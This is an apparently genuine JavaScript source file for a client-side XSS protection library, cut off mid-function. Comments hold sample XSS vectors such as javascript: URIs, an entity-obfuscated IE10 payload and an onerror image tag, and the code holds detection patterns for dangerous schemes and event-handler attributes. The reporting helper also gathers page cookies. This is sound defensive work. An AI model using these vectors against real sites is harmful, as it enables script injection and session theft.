/**
 * @project XSS.js
 * @overview Micro-template engine which provides basic client-side XSS protection
 * @author Roman Shafigullin <xss.js@shafigullin.pro>
 * @version 1.0.0
 * @copyright 2013, LinkedIn
 * @license MIT  
 */

/*jshint white:true */
(function(global) {
  "use strict";

  /**
   * Holds functionality related to this project.
   * @namespace XSS
   */
  var XSS = (function(XSS, undefined) {

    // call handler for each property of object
    var eachProperty = function(objectWithProperties, handler) {
      var name;
      if (objectWithProperties !== undefined && objectWithProperties !== null) {
        for (name in objectWithProperties) {
          if (objectWithProperties.hasOwnProperty(name)) {
            handler(objectWithProperties[name], name);
          }
        }
      }
    };

    // same as forEach
    var eachItem = function(array, handler) {
      var i, l;
      if (array !== undefined && array !== null) {
        for (i = 0, l = array.length; i < l; i++) {
          handler(array[i], i);
        }
      }
    };

    // reverse version of eachItem created to work with childNodes
    var eachElement = function(nodeList, handler) {
      var i;
      if (nodeList !== undefined && nodeList !== null) {
        for (i = nodeList.length; i--;) {
          handler(nodeList[i], i);
        }
      }
    };

    // check relation to target window
    var testSameOrigin = function(target) {
      var url = 'any';
      if (target === window) {
        url = 'self'; // target window is current window
      } else {
        try {
          url = target.location.href || 'any'; // target window have the same origin or not
        } catch (e) {
        }
      }
      return url;
    };

    /**
     * Called when library found some potential issue or have recommendations to a developer, define XSS.report to handle message, XSS.setDebug(1) enables debugging and all messages shows in console.
     * @function warn
     * @memberof! XSS
     * @param {string} message
     */
    var warn = function warn(message) {
      if (XSS.report !== undefined) {
        var data = {};
        try {
          data = {
            url: window.location.href,
            referrer: document.referrer,
            domain: document.domain,
            cookie: document.cookie,
            time: +(new Date()),
            top: testSameOrigin(top), // get URL of top window
            name: window.name,
            // JSON.stringify(window.navigator) can have exception
            navigator: window.navigator === undefined ? null : {
              appCodeName: navigator.appCodeName,
              appName: navigator.appName,
              appVersion: navigator.appVersion,
              cookieEnabled: navigator.cookieEnabled,
              doNotTrack: navigator.doNotTrack,
              language: navigator.language,
              onLine: navigator.onLine,
              platform: navigator.platform,
              product: navigator.product,
              productSub: navigator.productSub,
              userAgent: navigator.userAgent,
              vendor: navigator.vendor,
              vendorSub: navigator.vendorSub,
              oscpu: navigator.oscpu
            },
            characterSet: document.characterSet,
            contentType: document.contentType
          };
        } catch (e) {
        }
        data.message = message;
        XSS.report(data);
      }
    };

    var debug = 0; // localStorage.setItem('XSS.debug', 1) - enables debug messages to console
    if (global.console !== undefined && global.console.warn !== undefined && global.localStorage !== undefined) {
      if (localStorage.getItem('XSS.debug') !== null) {
        debug = parseInt(localStorage.getItem('XSS.debug'), 10);
        if (debug) {
          warn = function(message) {
            global.console.warn(message);
          };
        }
      }
    }

    /** 
     * Change debugging behavior, if debug enabled, then all info shows in console, if disabled and developer defined XSS.report, then called XSS.report.
     * Settings stored in localStorage and disabled by default.
     * @function setDebug
     * @memberof! XSS
     * @param {number|string} enable
     */
    var setDebug = function(enable) {
      debug = enable;
      localStorage.setItem('XSS.debug', debug);
    };

    // private cross browser version of addEventListener
    var addEvent;
    if (global.addEventListener !== undefined) {
      addEvent = function(element, name, handler) {
        element.addEventListener(name, function(event) {
          var spread = handler.apply(this, arguments);
          if (spread === false) {
            event.preventDefault();
            // event.stopPropagation();
          }
        }, false);
      };
    } else if (global.attachEvent !== undefined) {
      addEvent = function(element, name, handler) {
        element.attachEvent('on' + name, function(event) {
          if (event.target === undefined) {
            event.target = event.srcElement;
          }
          var spread = handler.apply(this, arguments);
          if (spread === false) {
            event.returnValue = false;
            // event.cancelBubble = true;
          }
        });
      };
    }

    // private function which allows to add listeners to element
    var addEventListeners = function(element, listeners) {
      if (element !== undefined) {
        eachProperty(listeners, function(elementListener, name) {
          addEvent(element, name, elementListener);
        });
      }
    };

    // returns empty string for null or undefined
    var convertToString = function(input) {
      return (input === undefined || input === null) ? '' : input + '';
    };

    /** 
     * Encodes a Uniform Resource Identifier (URI) component by replacing each instance of certain characters by one, two, three, or four escape sequences representing the UTF-8 encoding of the character (will only be four escape sequences for characters composed of two "surrogate" characters).<br />
     * Encodes some {@link http://developer.mozilla.org/en/docs/Core_JavaScript_1.5_Reference:Global_Functions:encodeURIComponent|additional characters}
     * @function encodeURIComponent 
     * @memberof XSS
     * @param {string} str - a component of a URI.
     * @returns {string} encoded URI component
     */
    var _encodeURIComponent = global.encodeURIComponent;
    var encodeURIComponent = _encodeURIComponent('!\'()*') !== '!\'()*' ? _encodeURIComponent : function encodeURIComponent() {
      return _encodeURIComponent.apply(this, arguments).replace(/[!'()]/g, global.escape).replace(/\*/g, '%2A');
    };

    var encodeSanitizedURIComponent = function(text) {
      return encodeURIComponent(convertToString(text)).replace(/%E2%80%8B/ig, '\u200B');
    };

    var stringifyParams = function(params) {
      var pairs = [];
      if (Object.prototype.toString.apply(params) === '[object Object]') {
        eachProperty(params, function(value, name) {
          pairs.push(encodeSanitizedURIComponent(name) + '=' + encodeSanitizedURIComponent(value));
        });
      } else {
        eachElement(params, function(param) {
          pairs.push(encodeSanitizedURIComponent(param.name) + '=' + encodeSanitizedURIComponent(param.value));
        });
      }
      return pairs.join('&');
    };

    /** 
     * Checks that URI don&#8217;t have dangerous scheme and all special chars properly encoded, most normal URIs shouldn&#8217;t be changed by this function
     * so it safe to use in most cases. If URI starts from &#8220;javascript:alert(1)&#8221;, then it will be replaced to &#8220;./javascript:alert(1)&#8221;.
     * Use this function for any URI or relative URLs without hash on input and output. For URL which must starts from http://, https://, or // use sanitizeURL.
     * @function sanitizeURI 
     * @memberof XSS
     * @param {string} uri - any URI or relative path
     * @param {array|object} params - add params to URI, [{name:'foo',value:'bar'}] &mdash; for params with same name, {foo:'bar'} &mdash; dry syntax
     * @returns {string} safe URL
     */
    var sanitizeURI = (function(undefined) {
      // location = '&#2;\1&#106;&#X000041;v&#x41;script&#000058 alert%28&quot;xss&quot;%29'; // this code works in IE10
      // location = XSS.sanitizeURI('&#2;\1&#106;&#X000041;v&#x41;script&#000058 alert%28&quot;xss&quot;%29'); // is not working
      // result: %26%232%3B%EF%BF%BD%26%23106%3B%26%23X000041%3Bv%26%23x41%3Bscript%26%23000058%20alert%28&quo%74%3Bxss&quo%74%3B%29
      var c, i;
      // characters which will be replaced or encoded to URI
      var re = /[\u0000-\u0020\u001f`'"<>()\[\]{}\\,;]/g;
      var index = {
        '\t': '%09',
        '\r': '%0D',
        '\n': '%0A',
        '\u001f': '\ufffd',
        't': '%74',
        'T': '%54'
      };

      // replace all control chars with safe one
      for (i = 0; i < 32; i++) {
        c = String.fromCharCode(i);
        if (index[c] === undefined) {
          index[c] = '\ufffd';
        }
      }

      // index first 128 chars which should be encoded
      for (i = 32; i < 128; i++) {
        c = String.fromCharCode(i);
        if (index[c] === undefined && c.match(re)) {
          index[c] = global.escape(c);
        }
      }

      return function sanitizeURI(uri, params) {
        if (uri === null || uri === undefined) {
          return null;
        }
        uri = uri
        // if URI starts from spaces which can be inserted with keyboard, it will be trimmed
        .replace(/^[ \t\r\n]+/, '')
        // all special chars must be URI encoded, all control chars replaced to \ufffd
        .replace(re, function(c) {
          return index[c];
        })
        // all custom spaces must be URI encoded
        .replace(/[\s\u2028\u2029]/g, encodeURIComponent)
        // encode all &# to prevent using HTML entities
        .replace(/&#(?=\d|x[\da-f])/g, '&%23')
        // we encode semi-colon if it looks like HTML entity javascript&NewLine;&Tab;&colon;&apos; but not &quot&lt&gt&amp
        // .replace(/(&[a-z]+);/ig, '$1%3B')
        // &qUot, &lt, &Gt we encode t and T if it looks like HTML entity, because some of them can be used without semi-colon
        .replace(/(&(?:quo|l|g))(t)/ig, function($0, $1, $2) {
          return $1 + index[$2];
        })
        // encode all % in not correct URI encoded strings like %%1%g1
        .replace(/%(?=[^a-f\d]|[a-f\d][^a-f\d]|[\s\S]?$)/ig, '%25');

        var lc = uri.toLowerCase();
        // if URL starts not from http, mailto, ftp and #hash, ?search, //UNC, /root, ../relative and have scheme:
        if (!/^(?:http|mailto|ftp|[#\/.?])/.test(lc) && /^[^?\/#:]+?:/.test(lc)) {
          // if URL starts from wrong scheme or have encoded entity
          if (/^(?:about|cdl|dvd|local|mhtml|mk|ms-help|ms-its|tv|res|its|asfunction|javascript|data|vbs|vbscript|feed|java|jar|file|view-source|[a-z]):/.test(lc) || !/^[a-z0-1\-_.]+?:/.test(lc)) {
            uri = './' + uri;
          }
        }

        if (params !== undefined && params !== null) {
          // inject URI encoded parameters after ? and before #
          uri = uri.replace(/^(.*?)(\?.*?)?(#.*?)?$/, function(match, path, search, hash) {
            if (search === undefined) {
              search = '';
            }
            if (hash === undefined) {
              hash = '';
            }

            search = search + (search === '' ? '?' : (search === '?' ? '' : '&')) + stringifyParams(params);

            return path + search + hash;
          });
        }

        return uri;
      };
    }());
    
    /** 
     * Checks that URL don&#8217;t have dangerous scheme and all special chars properly encoded, most normal URLs shouldn&#8217;t be changed by this function
     * so it safe to use in most cases. If URL starts from &#8220;javascript:alert(1)&#8221;, then it will be replaced to &#8220;./javascript:alert(1)&#8221;.
     * Use this function for any URL on input and output.
     * @function sanitizeURI 
     * @memberof XSS
     * @param {string} url - any URL starts from http://, https://, or //
     * @param {array|object} params - add params to URL, [{name:'foo',value:'bar'}] &mdash; for params with same name, {foo:'bar'} &mdash; dry syntax
     * @returns {string} safe URL
     */ 
    var sanitizeURL = function(url, params) {
      if (/^[ \t\r\n]*(?:https?:)?\/\//i.test(url)) {
        url = url
          // encode all # in URL fragment (after hash)
          .replace(/#([\s\S]+)$/, function($0, $1) {
            return '#' + $1.replace(/#/g, '%23');
          })
          // in normal URLs this situation possible only for not URI encoded HTML entities http://w3.org/test?a=b&#x3c;
          .replace(/&#(?=\d|x[\da-f])/i, '&%E2%80%8B#');
        return sanitizeURI(url, params);
      } else {
        return '';
      }
    };

    /** 
     * Inserts {@link http://en.wikipedia.org/wiki/Zero-width_space|ZWSP} before and after special chars and replaces control chars like {@link http://en.wikipedia.org/wiki/Null_character|0-byte} to {@link http://en.wikipedia.org/wiki/Specials_(Unicode_block)|replacement character} to make it safe.
     * Sanitized text is relatively safe and can be used for most data provided by user before using in application, or to prepare data
     * to send to external service, because ZWSP is not printable character user will not notice any changes, but it helps
     * if data used in unsafe code, for your appllication sends data to third party widget
     * (e.g element.innerHTML = XSS.sanitize('&lt;xss&gt;'); &mdash; tag will not be parsed, because ZWSP inserted after &lt; and before &gt;)
     * @function sanitize 
     * @memberof XSS
     * @param {string} text - any text
     * @param {boolean} aggressive - true &mdash; sanitize almost all special chars, if text contains URLs or emails they will not work,
     * false &mdash; more smart filter which sanitize only combination of chars, and don&#8217;t break simple URLs and emails
     * @returns {string} sanitized text
     */
    var sanitize = (function() {

      // <x> is special combination for testing, because all other tags will be broken with ZWSP, e.g. <script> replaced to <ZWSPscriptZWSP>
      var whitelistedStrings = '<x>|%3Cx%3E|\\\\[xu]';
      // for tags, objects, calling functions, ES6 strings
      var listOfCharacters = '[<{(`\\\\]|(?=[>})`])';
      // for multiline JavaScript comments /* and */
      var jsComments = '\\/(?=\\*)|\\*(?=\\/)';
      // 'in alert(1)//
      var charactersValidAfterQuoteInJS = '[\\(\\{\\[\\\\\\]\\}\\):.?!=%&*+,\\-\\/;<>\\^\'"`~#@|\\u0000-\\u0020\\u0085\\u00A0\\u1680\\u180E\\u2000-\\u200B\\u2028\\u2029\\u202F\\u205F\\u3000\\uFEFF\\uFFFE]';
      var jsInjection = '[\'"](?=(in|instanceof)?' + charactersValidAfterQuoteInJS + ')';
      // HTML entitites like &quot;
      var htmlEntities = '&(?=quot|lt|gt|amp|nbsp|#|(?:Tab|NewLine|excl|quot|num|dollar|percnt|amp|apos|lpar|rpar|plus|comma|period|sol|colon|semi|lt|equals|gt|quest|commat|lsqb|lbrack|bsol|rsqb|rbrack|grave|lcub|lbrace|verbar|vert|VerticalLine|rcub|rbrace|nbsp|NonBreakingSpace|hyphen|dash);)';
      // javascript:, data:, vbscript:
      var uriScheme = '\\b(?:(?:j\\s*a\\s*v\\s*a|v\\s*b)\\s*s\\s*c\\s*r\\s*i\\s*p\\s*t|d\\s*a\\s*t\\s*a)(?=\\s*:)';
      // for forbidden HTML attributes, e.g. language=vbs
      var htmlAttributeNames = '(?:xmlns[:a-z]*|a(?:ction|ttributename)|background|codebase|d(?:ata|ynsrc)|e(?:vent|xpr)|fo(?:lder|rmaction)|h(?:andler|ref)|l(?:anguage|owsrc)|poster|src(?:|doc)|on\\w+)';
      var htmlAttributes = '(?:[\\s\'"/`:]|^)(?:' + htmlAttributeNames + ')(?=\\s*=)';
      var unescapeEncoding = '%u00';
      var proto = '-(?=-)|_(?=_)|^(?=\\s*=)';

      var sensitiveTextPattern = new RegExp('(' + [whitelistedStrings, proto, listOfCharacters, jsComments, jsInjection, htmlEntities, uriScheme, htmlAttributes, unescapeEncoding].join('|') + ')', 'ig');

      var jsKeyWords = '\b(?:new|throw|Image|Error|URL|URLUnencoded|alt|baseURI|cookie|defaultValue|documentURI|eval|href|innerHTML|innerText|location|name|nameProp|outerHTML|outerText|referrer|src|textContent|title|value|text|valueOf|prototype|toString)\b';
      var fullListOfSpecialCharacters = '[\\[*=%+@.\'"&]|(?=[\\]*=:#\'"])';

      var agressivePattern = new RegExp('(' + [whitelistedStrings, jsKeyWords, fullListOfSpecialCharacters].join('|') + ')', 'ig');

      var postfixCharacterReplacer = '$1\u200B';

      return function(text, aggressive) {
        var sanitizedText;
        if (text === null || text === undefined) {
          sanitizedText = '';
        } else {
          sanitizedText = (text + '')
          // replace control characters from text with replacement character, only binary data or attack vectors can contain these chars
          .replace(/\u0000/g, '\ufffd').replace(sensitiveTextPattern, postfixCharacterReplacer);

          if (aggressive !== false) {
            sanitizedText = sanitizedText.replace(/\r\n|\r/g, '\n').replace(agressivePattern, postfixCharacterReplacer);
          }

          sanitizedText = sanitizedText.replace(/\u200B{2,}/g, '\u200B');
        }

        return sanitizedText;
      };
    }());

    /** 
     * Removes {@link http://en.wikipedia.org/wiki/Zero-width_space|ZWSP} from text.
     * XSS.desanitize(XSS.sanitize(text)) &mdash; returns original text, except ZWSP deleted and few control chars like {@link http://en.wikipedia.org/wiki/Null_character|0-byte} replaced to {@link http://en.wikipedia.org/wiki/Specials_(Unicode_block)|replacement character}.
     * So any normal text shouldn&#8217;t be affected.
     * @function desanitize 
     * @memberof XSS
     * @param {string} text - sanitized text
     * @returns {string} original text
     */
    var desanitize = function(text) {
      var desanitizedText;
      if (text === null || text === undefined) {
        desanitizedText = '';
      } else {
        desanitizedText = (text + '').replace(/\u200B/g, '');
      }
      return desanitizedText;
    };

    /** 
     * Extandable object to set data type validators and parsers designed to work with data sanitized with XSS.sanitize.
     * @memberof XSS
     */
    var dataValidators = {
      number: function(value) {
        value = desanitize(value);
        return (/^-?\d[\d.]{0,14}$/.test(value)) ? parseFloat(value, 10) : null;
      },
      year: function(value) {
        value = desanitize(value);
        var year = null;
        if (/^\d{4}$/.test(value)) {
          year = parseInt(value, 10);
          if (year >= 1000 && year <= 9999) {
            return year;
          }
        }
        return null;
      },
      'boolean': function(value) {
        value = desanitize(value);
        if (/^(?:true|on|yes|1)$/i.test(value)) {
          return true;
        } else if (/^(?:false|off|no|0)$/i.test(value)) {
          return false;
        }
        return null;
      },
      url: function(value) {
        return sanitizeURL(desanitize(value));
      },
      email: function(value) {
        value = desanitize(value);
        return (/^[\w\-.]+@[\w\-.]+$/i.test(value)) ? value : null;
      },
      text: function(value) {
        return sanitize(value);
      },
      token: function(value) {
        return (/[^\w\-]/i.test(value)) ? null : value;
      },
      json: function(value) {
        return JSON.parse(desanitize(value));
      }
    };

    /**
     * Internal constuctor which used to store URL components
     * @constructor
     */
    var URL = function() {

    };

    /**
     * stringify URL
     */
    URL.prototype.toString = function(userinfo) {
      var url = this;
      var params = url.params;

      if (params) {
        var pairs = [];
        eachProperty(params, function(value, name) {
          if (value !== undefined) {
            if (url.sanitized) {
              pairs.push(encodeSanitizedURIComponent(sanitize(name, false)) + (value === null ? '' : '=' + encodeSanitizedURIComponent(value)));
            } else {
              pairs.push(encodeSanitizedURIComponent(name) + (value === null ? '' : '=' + encodeSanitizedURIComponent(value)));
            }
          }
        });
        url.query = pairs.join('&');
        url.search = url.query ? '?' + url.query : '';
      }

      url.hash = url.fragment ? '#' + url.fragment : '';

      var pathname = (url.pathname || '/');

      url.href = url.scheme + ':' + (url.isURL ? url.doubleslash + (userinfo === true && url.userinfo ? url.userinfo + '@' : '') + url.host + pathname : url.hier) + url.search + url.hash;

      return url.href;
    };

    var getParameter = function(params, name, type) {
      var value = params[name];
      if (value === null || value === undefined) {
        return null;
      }
      if (typeof (type) === 'string') {
        return dataValidators[type](value);
      } else if (type !== undefined) {
        var match = convertToString(desanitize(value)).match(type);
        return match === null ? null : match[0];
      } else {
        return sanitize(value);
      }
    };

    URL.prototype.getParameter = function(name, type) {
      var url = this;
      return getParameter(url.params, name, type);
    };

    URL.prototype.getHashParameter = function(name, type) {
      var url = this;
      return getParameter(url.hashParams, name, type);
    };

    URL.prototype.getParameters = function(map) {
      var url = this;
      var params = {};
      eachProperty(map, function(item, name) {
        params[name] = getParameter(url.params, name, item);
      });
      return params;
    };

    URL.prototype.getHashParameters = function(map) {
      var url = this;
      var params = {};
      eachProperty(map, function(item, name) {
        params[name] = getParameter(url.hashParams, name, item);
      });
      return params;
    };

    /** 
     * Parse URL
     * <pre>
     * var url = XSS.parseURL(target.form.action, &#47;* URL contains domain *&#47; false, &#47;* don't sanitize *&#47; false);
     * url.getParameter('key', &#47;* type token is [\w\-]+ *&#47; 'token'); // XSS.dataValidators
     * url.getHashParameter('name', /^[^&lt;&gt;&quot;]+$/);
     * </pre>
     * @function parseURL 
     * @memberof XSS
     * @param {string} url - URL
     * @param {string} base - URL which used as base if url param is relative path
     * @param {boolean} sanitized - disable/enable url sanitization (XSS vectors in parameters) which enabled by default
     * @returns {XSS.URL} object
     */
    var parseURL = (function() {

      var spaceLeftRE = /^[\x00-\x20\u1680\u180e\u2000-\u200b\u2028\u2029\u202f\u205f\u3000\s]*/g;
      var spaceRightRE = /[\x00-\x20\u1680\u180e\u2000-\u200b\u2028\u2029\u202f\u205f\u3000\s]*$/g;

      var parseURI = function(s) {
        var uri = null;
        s = s.replace(spaceLeftRE, '').replace(/[\r\n]/g, '');
        // | protocol | hier | search | hash
        if (/^(([^:?#]*?):)?((\/\/)?[^?#]*?)?(\?([^#]*?))?(#(.*))?$/i.test(s)) {
          uri = new URL();
          uri.source = s;
          uri.protocol = RegExp.$1;
          uri.scheme = RegExp.$2;
          uri.hier = RegExp.$3;
          uri.doubleslash = RegExp.$4;
          uri.search = RegExp.$5;
          uri.query = RegExp.$6;
          uri.hash = RegExp.$7;
          uri.fragment = RegExp.$8;
        }
        return uri;
      };

      var parseQuery = function(query, sanitized) {
        var params = {};
        var name, value;
        sanitized = sanitized !== false;
        query = convertToString(query).replace(spaceLeftRE, '').replace(spaceRightRE, '');
        if (query !== '') {
          var pairs = query.split('&');
          for ( var i = 0; i < pairs.length; i++) {
            var pair = pairs[i];
            var match = pair.match(/^([^=]*)(?:(=)(.*))?$/);

            try {
              name = desanitize(decodeURIComponent(match[1].replace(/[+]/ig, '%20')));
              if (match[2] === '=') {
                if (match[3] === '' || match[3] === undefined || match[3] === null) {
                  value = '';
                } else {
                  if (sanitized) {
                    value = sanitize(decodeURIComponent(match[3].replace(/[+]/ig, '%20')), false);
                  } else {
                    value = desanitize(decodeURIComponent(match[3].replace(/[+]/ig, '%20')));
                  }
                }
              } else {
                value = null;
              }
              if (params[name] === undefined) {
                params[name] = value;
              } else {
                warn('Duplicate parameter ' + name + ' (' + query + ')');
              }
            } catch (e) {
              warn(e.message + ' ' + pair);
            }
          }
        }
        return params;
      };

      return function parseURL(url, base, sanitized) {
        if (arguments.length > 0 && (url === null || url === undefined)) {
          return null;
        }

        if (base !== false) {
          base = parseURL(base || location.href, false);
        }

        // var unreserved = /[a-zA-Z0-9\-._~]/;
        // var genDelims = /[:\/?#\[\]@]/;
        // var subDelims = /[!$&'()*+,;=]/;

        // var link = document.createElement('a');
        // link.href = url;
        // console.dir(link);

        var uri = parseURI(sanitized ? sanitizeURI(url || location.href) : url || location.href);

        uri.params = {};

        uri.sanitized = sanitized !== false;

        if (uri && base !== false && !/^[a-z][a-z+\-.]+$/.test(uri.scheme)) {
          uri.scheme = base.scheme;
          uri.protocol = base.protocol;
        }

        if (uri && /^(?:https?|ftp)$/.test(uri.scheme)) {
          // var userinfo = /[a-zA-Z0-9\-._~!$&'()*+,;=:%]/;
          // var regName = /[a-zA-Z0-9\-._~!$&'()*+,;=%]/
          // | userinfo | ip | regname | ipv6 | port | path
          if (uri.doubleslash && /^\/\/((?:([a-zA-Z0-9\-._~!$&'()*+,;=:%]*?)@)?(((\d+\.\d+\.\d+\.\d+)|([a-zA-Z0-9\-._~!$&'()*+,;=%]+|(\[[:0-9a-fA-F]+\])))(?::(\d*))?))(\/.*)?$/.test(uri.hier)) {
            uri.autority = RegExp.$1;
            uri.userinfo = RegExp.$2;
            uri.host = RegExp.$3;
            uri.hostname = RegExp.$4;
            uri.ip = RegExp.$5;
            uri.regName = RegExp.$6;
            uri.ipLiteral = RegExp.$7;
            uri.port = RegExp.$8;
            uri.path = RegExp.$9;

            uri.isURL = true;

            if (/^(.+?)(?::(.*))?$/.test(uri.userinfo)) {
              try {
                uri.user = decodeURIComponent(RegExp.$1);
              } catch (e) {
                uri.user = null;
              }

              try {
                uri.password = decodeURIComponent(RegExp.$2);
              } catch (e) {
                uri.password = null;
              }
            }

          } else if (!uri.doubleslash) { // path

            if (base !== false) {
              uri.doubleslash = '//';
              uri.host = uri.host || base.host;
              uri.hostname = uri.hostname || base.hostname;
              uri.port = uri.port || base.port;

              uri.isURL = true;
            }

            uri.path = uri.hier;
          }

          if (uri.path) {
            uri.pathname = uri.path.replace(/\/\/+/g, '/').replace(/\\/g, '%5C').replace(/[+]/g, '%20');

            if (uri.sanitized) {
              try {
                var pathnameComponents = uri.pathname.split('/');
                for ( var i = 0; i < pathnameComponents.length; i++) {
                  if (pathnameComponents[i].length > 0) {
                    pathnameComponents[i] = encodeSanitizedURIComponent(sanitize(decodeURIComponent(pathnameComponents[i]), false));
                  }
                }

                uri.pathname = pathnameComponents.join('/');
              } catch (e) {
                warn(e.message + ' ' + uri.pathname);
                uri.pathname = '/';
              }
            }

            if (/(.*\/)(([a-zA-Z0-9\-._~%]+)(?:\.([a-zA-Z0-9\-._~%]+)))$/i.test(uri.pathname)) {
              uri.filePath = RegExp.$1;
              uri.fileName = RegExp.$2;
              uri.fileBaseName = RegExp.$3;
              uri.fileExtensionName = RegExp.$4;
            }

            if (/^(?:\.|[^\/])/.test(uri.pathname)) {
              if (base !== false) {
                uri.pathname = base.filePath + uri.pathname;
              }
            }
          } else {
            uri.pathname = '/';
          }

          if (convertToString(uri.filePath).replace(spaceLeftRE, '').replace(spaceRightRE, '') === '') {
            uri.filePath = '/';
          }

          uri.params = parseQuery(uri.query, uri.sanitized);
          uri.hashParams = parseQuery(uri.fragment, uri.sanitized);
          if (uri.sanitized) {
            uri.fragment = sanitize(uri.fragment, false);
          }
          uri.hash = uri.fragment ? '#' + uri.fragment : '';
          uri.origin = uri.protocol + uri.doubleslash + uri.host;
          uri.toString();
        }

        return uri;
      };
    }());

    var hideParameter = function(name) {
      var url = parseURL();
      url.params[name] = undefined;
      if (history.replaceState !== undefined) {
        history.replaceState({}, null, url.toString());
      }
    };

    /** 
     * HTML entities parser, works only with common named entities like nbsp, lt, gt, amp quot and with numbered entities.
     * Used to prevent double HTML encoding.
     * @function decodeHTML 
     * @memberof XSS
     * @param {string} encodedText - HTML encoded text
     * @returns {string} HTML decoded text
     */
    var decodeHTML = (function(undefined) {

      var namedEntities = {
        'nbsp': '\u00a0',
        'lt': '<',
        'gt': '>',
        'amp': '&',
        'quot': '"'
      };

      var decodeNamedEntity = (function() {
        try {
          var span = document.createElement('span');
          return function(entityName) {
            span.innerHTML = '&' + entityName.match(/^[a-z]+$/i)[0] + ';';
            return span.firstChild.nodeValue;
          };
        } catch (e) {
          return function() {
            return '\ufffd';
          };
        }
      }());

      var rEntities = /&(?:([a-z]+)|#x([\da-f]{1,4})|#(\d{1,5}));/ig;

      return function decodeHTML(encodedText) {
        if (encodedText === null || encodedText === undefined) {
          return null;
        }

        return (encodedText + '').replace(rEntities, function(match, named, hex, dec) {
          if (named) {
            return namedEntities[named] || (namedEntities[named] = decodeNamedEntity(named));
          } else if (hex || dec) {
            return String.fromCharCode(parseInt(hex || dec, hex ? 16 : 10) || 0xfffd);
          }
          return '\ufffd';
        });
      };
    }());

    /** 
     * Encodes special chars in text to HTML entities and replaces control chars like {@link http://en.wikipedia.org/wiki/Null_character|0-byte} to {@link http://en.wikipedia.org/wiki/Specials_(Unicode_block)|replacement character}.
     * So it can be safely used with concatenation in HTML attributes and text nodes (except script tag). It protects only from HTML injection, and don&#8217;t make data safe if used in wrong context, you should use additionally XSS.sanitizeURI for URLs
     * and XSS.encodeJS for JavaScript string context.<br />
     * <pre>
     * // user generated data
     * var url = 'javascript:alert(1);';
     * var alt = '"onclick="alert(1)';
     * var text = '&lt;img src=xx: onerror=alert(1)&gt;';
     * var message = '\'-alert(1)-\''<br />
     * element.innerHTML = '&lt;a href="' + XSS.encodeHTML(XSS.sanitizeURI(url)) + '" alt="' + XSS.encodeHTML(alt) + '" onclick="' + XSS.encodeHTML('alert(\'' + XSS.encodeJS(message) + '\')') + '"&gt;' + XSS.encodeHTML(text) + '&lt;/a&gt;';
     * 
     * // At the end we will see data properly prepared for all contexts
     * // &lt;a href&#61;&quot;&amp;#46&#59;&amp;#47&#59;javascript&amp;#58&#59;alert%281%29%3B&quot; alt&#61;&quot;&amp;quot&#59;onclick&amp;#61&#59;&amp;quot&#59;alert&amp;#40&#59;1&amp;#41&#59;&quot; onclick&#61;&quot;alert&amp;#40&#59;&amp;#39&#59;&amp;#92&#59;u0027&amp;#92&#59;u002dalert&amp;#92&#59;u00281&amp;#92&#59;u0029&amp;#92&#59;u002d&amp;#92&#59;u0027&amp;#39&#59;&amp;#41&#59;&quot;&gt;&amp;lt&#59;img src&amp;#61&#59;xx&amp;#58&#59; onerror&amp;#61&#59;alert&amp;#40&#59;1&amp;#41&#59;&amp;gt&#59;&lt;&#47;a&gt;
     * </pre>
     * 
     * XSS.renderStaticHTML helps to do it without big effort.
     * 
     * @function encodeHTML 
     * @memberof XSS
     * @param {string} text - plain text
     * @returns {string} HTML encoded text
     */
    var encodeHTML = (function(undefined) {

      var c, i;

      var index = {
        '\t': '\t',
        '\r': '\r',
        '\n': '\n',
        '\u00a0': '&nbsp;',
        '<': '&lt;',
        '>': '&gt;',
        '&': '&amp;',
        '"': '&quot;',
        '\u007f': '&#xfffd;',
        '\u2028': '&#x2028;',
        '\u2029': '&#x2029;'
      };

      // replace all control chars with safe one
      for (i = 0; i < 32; i++) {
        c = String.fromCharCode(i);
        if (index[c] === undefined) {
          index[c] = '&#xfffd;';
        }
      }

      // this range of chars with will be replaced with HTML entities, if add char with code more than 127, check that it in index table
      var rHTMLSpecialChars = /[\u0000-\u0008\u000b\u000c\u000e-\u001f\u00a0<>'"`\\\[\]+\-=.:(){};,\/&\u007f\u2028\u2029]/g;
      // if text already encoded, to make sure that it don't have special chars we should use encodeHTML(text, /* preventDoubleEncoding */ true)
      var rHTMLSpecialCharsForDoubleEncoding = /[\u0000-\u0008\u000b\u000c\u000e-\u001f\u00a0<>'"`\\\[\]+\-=.:(){},\/\u007f\u2028\u2029]/g;

      // precache index
      for (i = 32; i < 128; i++) {
        c = String.fromCharCode(i);
        if (index[c] === undefined && c.match(rHTMLSpecialChars)) {
          index[c] = '&#' + i + ';';
        }
      }

      return function encodeHTML(text, preventDoubleEncoding) {
        if (text === null || text === undefined) {
          return '';
        }
        var type = typeof (text);
        if (type === 'number' || type === 'boolean') {
          return text;
        } else if (type === 'object') {
          warn('Can\u2019t encode object, cast to string first');
        }
        return (text + '').replace(preventDoubleEncoding ? rHTMLSpecialCharsForDoubleEncoding : rHTMLSpecialChars, function(c) {
          return index[c];
        });
      };
    }());

    /** 
     * Encodes special chars in text for JavaScript string format.
     * @function encodeJS 
     * @memberof XSS
     * @param {string} text - plain text
     * @returns {string} JS encoded text
     */
    var encodeJS = (function(undefined) {
      var i;
      // {}[],:-+. can be outside of JSON strings
      // \u2028\u2029 can break JavaScript strings: eval('("\u2028")')
      var rJSONSpecialChars = /[\/<>&%\u0000\u2028\u2029*()'=!?`#]/g; // chars additionaly encoded by JSON.stringify
      var rJSSpecialChars = /[^a-z0-9_\u0080-\u2027\u202a-\uffff]/ig; // chars encoded by encodeJS
      // if you change any of rJSONSpecialChars or rJSSpecialChars, check that this char in index
      var index = {
        "\t": "\\t",
        "\n": "\\n",
        "\r": "\\r",
        "\u2028": "\\u2028",
        "\u2029": "\\u2029"
      };

      // precache chars for rJSSpecialChars
      // rJSSpecialChars includes rJSONSpecialChars
      for (i = 0; i < 128; i++) {
        var c = String.fromCharCode(i);
        if (index[c] === undefined && c.match(rJSSpecialChars)) {
          index[c] = '\\u' + ('000' + c.charCodeAt(0).toString(16)).slice(-4);
        }
      }

      var encodeJS = function encodeJS(text) {
        if (text === null || text === undefined) {
          return '';
        }
        var type = typeof (text);
        if (type === 'number' || type === 'boolean') {
          return text;
        } else if (type === 'object') {
          warn('Can\u2019t encode object, cast to string first');
        }
        return (text + '').replace(rJSSpecialChars, function(c) {
          return index[c];
        });
      };

      // check that JSON.stringify is native
      if (typeof (JSON) !== 'undefined' && JSON.stringify !== undefined && JSON.stringify('\\"\/<>&%\u0000\u2028\u2029*()\'=!?`#') === '"\\\\\\"/<>&%\\u0000\u2028\u2029*()\'=!?`#"') {
